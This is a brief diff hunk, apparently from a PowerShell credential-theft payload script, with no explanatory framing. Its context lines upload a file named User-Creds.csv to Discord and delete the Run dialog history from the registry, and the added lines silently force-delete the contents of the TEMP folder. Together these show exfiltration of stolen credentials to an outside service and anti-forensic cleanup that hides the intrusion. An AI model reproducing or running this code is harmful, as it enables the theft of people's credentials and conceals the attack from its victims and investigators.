@@ -102,6 +102,8 @@ Upload-Discord -file $env:TMP\User-Creds.csv
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
 
 
 
